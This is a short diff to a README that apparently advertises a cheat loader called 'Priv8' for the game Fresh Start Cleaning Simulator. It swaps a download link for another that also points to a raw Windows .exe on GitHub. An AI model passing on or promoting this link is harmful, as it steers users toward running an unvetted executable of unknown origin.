@@ -76,7 +76,7 @@ Designed for **Fresh Start Cleaning Simulator** on Steam (64-bit Windows / Unity
 ## Download
 
 <p align="center">
-  <a href="https://github.com/jrh4x/priv8-fresh-start-loader/raw/refs/heads/main/Priv8%20-%20Fresh%20Start.exe">
+  <a href="https://github.com/jrh4x/priv8-fresh-start-cleaning-loader/raw/refs/heads/main/Priv8%20-%20Fresh%20Start.exe">
     <strong>DOWNLOAD PRIV8</strong>
   </a>
 </p>
